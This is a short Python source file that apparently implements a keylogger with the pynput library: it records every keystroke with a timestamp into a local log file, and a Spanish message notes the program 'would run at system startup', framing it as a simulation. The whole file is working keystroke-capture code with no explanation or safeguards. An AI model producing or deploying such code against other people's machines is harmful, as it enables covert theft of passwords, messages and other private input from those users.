from pynput import keyboard
import datetime
import os

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "log.txt")

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def write_log(key):
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{time}] {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{time}] {key}\n")

def on_press(key):
    write_log(key)

def main():
    print("[Simulación] El programa se ejecutaría al iniciar el sistema.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()